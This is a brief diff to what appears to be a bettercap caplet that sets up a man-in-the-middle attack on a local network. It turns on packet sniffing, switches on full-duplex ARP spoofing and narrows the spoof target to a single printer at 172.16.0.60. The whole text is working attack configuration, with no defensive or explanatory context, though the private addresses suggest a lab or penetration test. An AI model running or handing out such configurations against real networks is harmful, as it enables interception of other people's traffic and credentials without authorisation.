@@ -18,7 +18,6 @@ net.sniff on
 
 # configure arp.spoofing for specified Printer:
 #set arp.spoof.internal true
-#set arp.spoof.fullduplex true
-#set arp.spoof.targets  172.16.0.3, 172.16.0.60
+set arp.spoof.fullduplex true
 set arp.spoof.targets  172.16.0.60
 arp.spoof on
